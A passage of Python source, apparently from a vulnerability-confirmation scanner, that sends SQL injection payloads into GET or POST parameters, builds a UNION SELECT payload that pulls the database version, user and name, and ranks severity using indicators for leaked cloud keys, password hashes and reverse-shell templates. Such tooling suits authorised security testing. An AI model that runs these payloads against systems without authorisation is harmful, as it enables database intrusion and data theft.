                                    break
                            except Exception:
                                continue

                    if confirmed_technique:
                        # Determine exploitability level
                        exploitability = []
                        if extracted.get("column_count"):
                            exploitability.append("data_read")
                        if extracted.get("db_version"):
                            exploitability.append("version_disclosure")
                        if extracted.get("db_user"):
                            exploitability.append("user_disclosure")
                        if extracted.get("db_name") or extracted.get("db_name_partial"):
                            exploitability.append("database_disclosure")
                        if "timing_proof" in extracted:
                            exploitability.append("blind_data_extraction")

                        extracted["exploitability"] = exploitability

                        # Capture HTTP exchange — re-send last successful payload
                        sqli_exchange = {}
                        try:
                            # Use the last confirmed payload to capture exchange
                            last_payload = None
                            if confirmed_technique.startswith("error"):
                                for ep, dbt in error_payloads:
                                    if dbt == extracted.get("db_type"):
                                        last_payload = ep
                                        break
                            elif confirmed_technique.startswith("UNION") and extracted.get("column_count"):
                                cc = extracted["column_count"]
                                cols = ["NULL"] * cc
                                ic = extracted.get("injectable_column", 0)
                                cols[ic] = "CONCAT('pHnT0m_',@@version,'_pHnT0m')"
                                last_payload = f"-1 UNION SELECT {','.join(cols)}-- -"
                            if last_payload:
                                cap_resp = await self._sqli_send(client, url, param, method, last_payload)
                                if cap_resp:
                                    sqli_exchange = self._capture_exchange(
                                        cap_resp, method, url, last_payload, param,
                                        {param: last_payload} if method.upper() == "POST" else None,
                                    )
                        except Exception:
                            pass

                        return {
                            "confirmed": True,
                            "method": confirmed_technique,
                            "proof": f"SQLi confirmed via {confirmed_technique}. Extracted: {', '.join(f'{k}={v}' for k, v in extracted.items() if k != 'exploitability')}",
                            "extracted_data": extracted,
                            "depth": "data_extraction" if extracted.get("column_count") else "blind_extraction",
                            "escalate_to": self._escalate_severity(extracted),
                            "title_detail": f"SQLi ({confirmed_technique})",
                            "impact_addition": f"SQL injection confirmed via {confirmed_technique}. DB version: {extracted.get('db_version', 'N/A')}. User: {extracted.get('db_user', 'N/A')}. Database: {extracted.get('db_name', extracted.get('db_name_partial', 'N/A'))}.",
                            "http_exchange": sqli_exchange,
                        }

            except Exception as e:
                logger.debug(f"SQLi confirmation error: {e}")

        return {"confirmed": False}

    async def _sqli_send(self, client, url, param, method, payload) -> httpx.Response | None:
        """Send a SQLi payload."""
        try:
            if method.upper() == "POST":
                return await client.post(url, data={param: payload})
            else:
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                return await client.get(test_url)
        except Exception:
            return None

    # -----------------------------------------------------------------------
    # Severity Escalation Engine
    # -----------------------------------------------------------------------
    def _escalate_severity(self, extracted_data: dict) -> str:
        """Determine severity based on what confirmation proved.

        Rules:
        - Can read local files -> HIGH
        - Can read credentials -> CRITICAL
        - Can execute commands -> CRITICAL
        - Can access internal services -> HIGH
        - Can access other users' data -> HIGH
        - Can read DB data via UNION -> CRITICAL (full data read)
        - Can read DB version via blind -> HIGH
        """
        # Check for credential access
        credential_indicators = [
            "iam_leak", "AccessKeyId", "SecretAccessKey", "service_account_token",
            "managed_identity_token", "ssh_key", "aws_creds_file", "shadow_hashes",
            "env_secrets", "passwd_read",
        ]
        for indicator in credential_indicators:
            if extracted_data.get(indicator):
                return "critical"

        # Check for command execution
        if extracted_data.get("can_write_files") or extracted_data.get("reverse_shell_templates"):
            return "critical"
        if extracted_data.get("whoami") or extracted_data.get("uid"):
            return "critical"

        # Check for full DB read (UNION-based)
        if extracted_data.get("column_count") and extracted_data.get("db_version"):
            return "critical"

        # Check for internal service access
        if extracted_data.get("internal_services"):
            return "high"
        if extracted_data.get("service"):
            return "high"

        # Check for file read
        if extracted_data.get("file_read") or extracted_data.get("users"):
            return "high"

        # Check for other users' data
        if extracted_data.get("records_accessed"):
            return "high"

        # Default to high for confirmed vulns
        return "high"

    # -----------------------------------------------------------------------
    # Generic Misconfiguration Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_misconfig(self, vuln, base_url: str) -> dict:
        """Confirm misconfiguration by testing the specific issue."""
        url = vuln.url or base_url
        if not url:
            return {"confirmed": False}

        # Re-fetch the URL and verify the issue still exists
        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        body = resp.text[:3000].lower()

                        # Check for common misconfig indicators
                        indicators = {
                            "debug_mode": ["debug = true", "debug_mode", "stack trace", "traceback"],
                            "directory_listing": ["index of /", "directory listing", "parent directory"],
                            "server_info": ["server:", "x-powered-by:", "x-aspnet-version:"],
                            "default_page": ["apache2 ubuntu default page", "welcome to nginx", "iis windows server"],
                        }

                        found = {}
                        for category, patterns in indicators.items():
                            for pattern in patterns:
                                if pattern in body:
                                    found[category] = pattern
                                    break

                        # Also check response headers
                        for header in ["server", "x-powered-by", "x-aspnet-version", "x-debug"]:
                            val = resp.headers.get(header)
                            if val:
                                found[f"header_{header}"] = val

                        if found:
                            return {
                                "confirmed": True,
                                "method": "Misconfiguration verified",
                                "proof": f"Found {len(found)} misconfiguration indicators",
                                "extracted_data": found,
                                "depth": "config_issue",
                                "title_detail": ", ".join(found.keys()),
                                "impact_addition": f"Misconfiguration confirmed: {json.dumps(found, indent=2)}",
                                "http_exchange": self._capture_exchange(resp, "GET", url),
                            }
            except Exception:
                pass

        return {"confirmed": False}
